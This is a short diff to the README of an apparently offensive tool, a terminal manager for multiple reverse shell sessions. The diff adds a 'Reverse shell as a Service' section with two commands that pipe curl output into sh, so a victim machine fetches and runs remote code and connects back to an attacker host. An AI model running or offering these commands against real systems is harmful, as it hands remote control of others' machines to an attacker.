@@ -18,5 +18,13 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 # TODO
 ```
 
+#### Reverse shell as a Service
+```
+# if you just want to mupliplexing the listening port
+sh -c "$(curl http://reverse:port/)"
+# victim will be redirected to attacker-host attacker-port
+sh -c "$(curl http://reverse:port/attacker-host/attacker-port)"
+```
+
 #### TODO
 - [ ] More interface in RESTful API
